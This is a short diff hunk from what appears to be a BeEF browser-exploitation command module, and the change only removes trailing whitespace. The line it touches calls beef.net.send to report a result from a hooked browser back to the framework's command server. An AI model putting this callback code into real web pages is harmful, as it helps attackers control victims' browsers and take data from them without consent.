@@ -44,6 +44,6 @@ beef.execute(function() {
     }
 
 
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
-   
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
+
 });
